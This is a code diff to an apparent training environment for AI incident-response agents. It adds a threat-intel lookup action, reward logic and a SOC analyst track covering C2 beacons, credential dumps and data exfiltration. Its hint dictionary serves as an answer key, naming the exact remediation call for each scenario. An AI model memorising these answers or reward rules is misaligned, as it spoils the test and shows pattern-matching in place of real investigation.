+                "lookup_threat_intel to check suspicious IPs against Feodo/Spamhaus feeds, "
+                "then apply_fix (revoke_session / isolate_host / revoke_credentials / revoke_access) "
+                "or write_terraform (aws_network_acl) to remediate. "
+                "Finally call verify() to confirm containment."
+            )
+        else:
+            investigation_hint = (
+                "Begin investigation. Use view_logs, view_metrics, list_resources, "
+                "run_cli, and view_billing to identify root causes. "
+                "Then apply_fix or write_terraform to remediate, and verify to confirm."
+            )
         return self._make_observation(
             action_output=(
                 "=== INCIDENT OPENED ===\n"
                 + self._scenario["initial_alert"]
-                + "\nBegin investigation. Use view_logs, view_metrics, list_resources, "
-                "run_cli, and view_billing to identify root causes. "
-                "Then apply_fix or write_terraform to remediate, and verify to confirm."
+                + f"\n{investigation_hint}"
             ),
             reward=0.0,
         )
@@ -1487,6 +2196,13 @@ class IncidentResponseEnvironment(Environment):
             resource_type = (params.get("resource_type") or target or "").lower().strip()
             config = params.get("config") or params.get("terraform") or ""
             output, reward = self._handle_write_terraform(resource_type, config)
+        elif action_type == "lookup_threat_intel":
+            ioc = (
+                params.get("ioc") or params.get("ip") or params.get("indicator")
+                or target or ""
+            ).strip()
+            ioc_type = (params.get("ioc_type") or params.get("type") or "ip").lower().strip()
+            output, reward = self._handle_lookup_threat_intel(ioc, ioc_type)
         elif action_type == "verify":
             output, reward = self._handle_verify(target)
         elif action_type == "escalate":
@@ -1677,6 +2393,40 @@ class IncidentResponseEnvironment(Environment):
             "apply_fix(target='iam_payment_role', fix_type='fix_iam', "
             "config_key='s3:GetObejct', config_value='s3:GetObject')"
         ),
+        # SOC Analyst track
+        "compromised_bastion_access": (
+            "Tor exit node 185.220.101.45 has active SSH session as svc_deploy → "
+            "lookup_threat_intel(ioc='185.220.101.45') then "
+            "apply_fix(target='bastion_host', fix_type='revoke_session', "
+            "config_key='session_token')"
+        ),
+        "malware_c2_beacon": (
+            "QakBot C2 beacon to 162.243.103.246:8080 from ENG-WORKSTATION-47 → "
+            "lookup_threat_intel(ioc='162.243.103.246') then "
+            "apply_fix(target='endpoint_security', fix_type='isolate_host', "
+            "config_key='ENG-WORKSTATION-47')"
+        ),
+        "credential_dump": (
+            "LSASS dump exposed 8 AD accounts — rotate all → "
+            "apply_fix(target='auth_service', fix_type='revoke_credentials', "
+            "config_key='compromised_accounts')"
+        ),
+        "active_c2_beacon": (
+            "QakBot C2 ONLINE at 50.16.16.211:443 — block at NACL FIRST → "
+            "lookup_threat_intel(ioc='50.16.16.211') then "
+            "write_terraform(resource_type='aws_network_acl', "
+            "config='{cidr: 50.16.16.211/32, rule: DENY, port: all}')"
+        ),
+        "lateral_movement": (
+            "4 hosts compromised via WMI/SMB lateral movement → "
+            "apply_fix(target='endpoint_security', fix_type='isolate_host', "
+            "config_key='infected_hosts')"
+        ),
+        "s3_data_exfiltration": (
+            "DataScienceRole exfiltrated 2.3 GB via stolen credentials → "
+            "apply_fix(target='s3_data_lake', fix_type='revoke_access', "
+            "config_key='compromised_iam_role')"
+        ),
     }
 
     def _handle_write_terraform(self, resource_type: str, config: str) -> Tuple[str, float]:
@@ -1729,16 +2479,26 @@ class IncidentResponseEnvironment(Environment):
                         f"\n\n🎯 STILL UNRESOLVED ({len(still_remaining)} remaining):\n"
                         + "\n".join(hints)
                     )
-                return (
-                    f"✅ TERRAFORM VALIDATED & APPLIED\n"
-                    f"Resource   : {resource_type or 'aws_wafv2_web_acl'}\n"
-                    f"Root cause : {rc_id.replace('_', ' ')} — RESOLVED\n"
-                    f"WAF rule deployed and attached to api_gateway.\n"
-                    f"Attack traffic from 203.0.113.0/24, 198.51.100.0/24, "
-                    f"192.0.2.0/24 is now BLOCKED.\n"
-                    f"Reward: +{reward:.2f}"
-                    f"{next_hint}"
-                ), reward
+                # Use scenario-defined success_message when available
+                custom_msg = fix_def.get("success_message", "")
+                if custom_msg:
+                    body = (
+                        f"✅ TERRAFORM VALIDATED & APPLIED\n"
+                        f"Resource   : {resource_type}\n"
+                        f"Root cause : {rc_id.replace('_', ' ')} — RESOLVED\n"
+                        f"{custom_msg}\n"
+                        f"Reward: +{reward:.2f}"
+                        f"{next_hint}"
+                    )
+                else:
+                    body = (
+                        f"✅ TERRAFORM VALIDATED & APPLIED\n"
+                        f"Resource   : {resource_type}\n"
+                        f"Root cause : {rc_id.replace('_', ' ')} — RESOLVED\n"
+                        f"Reward: +{reward:.2f}"
+                        f"{next_hint}"
+                    )
+                return body, reward
 
         # ── No remaining root cause was addressed ──────────────────────────────
         remaining = [r for r in correct_fixes if r not in self._fixes_applied]
@@ -1809,15 +2569,43 @@ class IncidentResponseEnvironment(Environment):
                     self._root_causes_identified.append(rc_id)
                 self._services_fixed.append(svc_target)
                 reward = W_ROOT_CAUSE + W_FIX_APPLIED
-                fix_desc = (
-                    f"adjust {config_key}={config_value}" if config_key else fix_type
-                )
-                return (
-                    f"✅ FIX APPLIED: {fix_desc} on {svc_target}\n"
-                    f"Root cause resolved: {rc_id.replace('_', ' ')}\n"
-                    f"Reward: +{reward:.2f}\n"
-                    f"Next: verify({svc_target!r}) to confirm."
-                ), reward
+                # Build next-steps hint for remaining root causes
+                correct_fixes_all = self._scenario.get("correct_fixes", {})
+                still_remaining = [
+                    r for r in correct_fixes_all if r not in self._fixes_applied
+                ]
+                next_hint = ""
+                if still_remaining:
+                    hints = [
+                        f"  • {r.replace('_', ' ').upper()}: "
+                        f"{self._RC_HINTS.get(r, 'investigate further')}"
+                        for r in still_remaining
+                    ]
+                    next_hint = (
+                        f"\n\n🎯 STILL UNRESOLVED ({len(still_remaining)} remaining):\n"
+                        + "\n".join(hints)
+                    )
+                else:
+                    next_hint = f"\n\n✅ All root causes resolved! Call verify({svc_target!r}) to confirm."
+                # Use scenario-defined success_message when available
+                custom_msg = fix_def.get("success_message", "")
+                if custom_msg:
+                    body = (
+                        f"{custom_msg}\n"
+                        f"Reward: +{reward:.2f}"
+                        f"{next_hint}"
+                    )
+                else:
+                    fix_desc = (
+                        f"adjust {config_key}={config_value}" if config_key else fix_type
+                    )
+                    body = (
+                        f"✅ FIX APPLIED: {fix_desc} on {svc_target}\n"
+                        f"Root cause resolved: {rc_id.replace('_', ' ')}\n"
+                        f"Reward: +{reward:.2f}"
+                        f"{next_hint}"
+                    )
+                return body, reward
 
         return (
             f"⚠️  Fix '{fix_type}' on '{target}' did not match any remaining root cause.\n"
@@ -1847,9 +2635,25 @@ class IncidentResponseEnvironment(Environment):
 
         if cause_fixed and target in post_fix:
             svc.update(post_fix[target])
-            # Cascade-heal downstream services
+            # Cascade-heal downstream services — but ONLY those whose root cause
+            # has also been applied.  Healing a service whose RC isn't fixed yet
+            # would give the agent a misleading "all healthy" signal.
+            fixed_rc_targets: set = set()
+            fixed_rc_affected: set = set()
+            for rc_id, fix_def in correct_fixes.items():
+                if rc_id in self._fixes_applied:
+                    fixed_rc_targets.add(
+                        fix_def["target"].replace("-", "_").replace(" ", "_")
+                    )
+                    for aff in fix_def.get("affected_services", []):
+                        fixed_rc_affected.add(aff.replace("-", "_").replace(" ", "_"))
+
             for downstream, ds_post in post_fix.items():
-                if downstream != target:
+                if downstream == target:
+                    continue
+                # Only cascade-heal if this downstream service is the direct
+                # target or an affected_service of an already-resolved root cause.
+                if downstream in fixed_rc_targets or downstream in fixed_rc_affected:
                     ds = self._services.get(downstream, {})
                     if ds.get("status") in ("degraded", "down"):
                         self._services[downstream].update(ds_post)
@@ -1881,12 +2685,74 @@ class IncidentResponseEnvironment(Environment):
     def _handle_escalate(self) -> Tuple[str, float]:
         self._escalated = True
         fixed = len(self._fixes_applied)
-        total = len(self._scenario["root_causes"])
+        total = len(self._scenario.get("root_causes", list(self._scenario.get("correct_fixes", {}).keys())))
         partial = fixed / max(1, total) * 0.5
         return (
             f"📞 ESCALATED — {fixed}/{total} root causes fixed before escalation.\n"
             f"Partial credit: {partial:.2f}"
         ), partial
+
+    def _handle_lookup_threat_intel(self, ioc: str, ioc_type: str) -> Tuple[str, float]:
+        """
+        Query the scenario's threat intelligence feed for a given IOC (IP/domain/hash).
+
+        Returns real Feodo/Spamhaus-sourced data when the IOC is in the scenario's
+        threat_indicators dict; returns a CLEAN verdict otherwise.  Rewards a small
+        exploration bonus on first lookup of a malicious IOC; penalises redundant calls.
+        """
+        threat_indicators = self._scenario.get("threat_indicators", {})
+        malicious_ips: list = threat_indicators.get("malicious_ips", [])
+        intel_db: dict = threat_indicators.get("intel", {})
+
+        if not ioc:
+            return (
+                "lookup_threat_intel requires an ioc parameter. "
+                "Example: lookup_threat_intel(ioc='1.2.3.4', ioc_type='ip')"
+            ), 0.0
+
+        query_key = f"threat_intel:{ioc}"
+        is_redundant = query_key in self._queries_seen
+
+        # Normalise for matching (strip port, lowercase, strip /32 CIDR)
+        ioc_clean = ioc.lower().split(":")[0].split("/")[0].strip()
+        matched_ip = next(
+            (ip for ip in malicious_ips if ip.lower().split("/")[0] == ioc_clean),
+            None,
+        )
+
+        if matched_ip and matched_ip in intel_db:
+            entry = intel_db[matched_ip]
+            lines = [
+                f"🔍 THREAT INTEL REPORT — {matched_ip}",
+                f"  Type        : {entry.get('type', 'Unknown')}",
+                f"  Confidence  : {entry.get('confidence', 'N/A')}",
+                f"  Status      : {entry.get('status', 'ACTIVE')}",
+                f"  Malware     : {entry.get('malware_family', 'N/A')}",
+                f"  ASN         : {entry.get('asn', 'N/A')}",
+                f"  Country     : {entry.get('country', 'N/A')}",
+                f"  Tags        : {', '.join(entry.get('tags', []))}",
+                f"  Feeds       : {', '.join(entry.get('feeds', []))}",
+                f"  Last seen   : {entry.get('last_seen', entry.get('last_reported', 'N/A'))}",
+                f"  Description : {entry.get('description', '')}",
+                f"  ⚡ Recommended: {entry.get('recommended_action', '')}",
+            ]
+            output = "\n".join(lines)
+            # Small reward for first lookup of a confirmed malicious IOC
+            reward = 0.0 if is_redundant else 0.05
+        else:
+            output = (
+                f"🔍 THREAT INTEL REPORT — {ioc}\n"
+                f"  Verdict     : CLEAN / NOT IN THREAT FEEDS\n"
+                f"  Checked     : Spamhaus DROP, Feodo Tracker, AbuseIPDB\n"
+                f"  Confidence  : LOW (absence of evidence ≠ evidence of absence)\n"
+                f"  Note: This IOC is not in the current scenario's threat feed. "
+                f"Check view_logs / run_cli for other indicators."
+            )
+            reward = 0.0
+
+        if not is_redundant:
+            self._queries_seen.append(query_key)
+        return output, reward
 
     # ── Helpers ───────────────────────────────────────────────────────────
 
